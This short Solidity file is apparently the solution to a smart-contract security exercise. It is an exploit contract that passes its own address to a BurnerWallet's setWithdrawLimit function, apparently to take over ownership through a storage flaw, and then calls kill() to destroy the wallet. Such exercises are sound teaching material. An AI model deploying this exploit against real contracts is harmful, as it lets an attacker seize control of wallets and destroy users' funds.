// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IBurnerWallet {
    // declare any function that you need to call on BurnerWallet
    function setWithdrawLimit(uint) external;
    function kill() external;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // write your code here
        IBurnerWallet _target = IBurnerWallet(target);
        _target.setWithdrawLimit(uint256(uint160(bytes20(address(this)))));
        _target.kill();
    }
}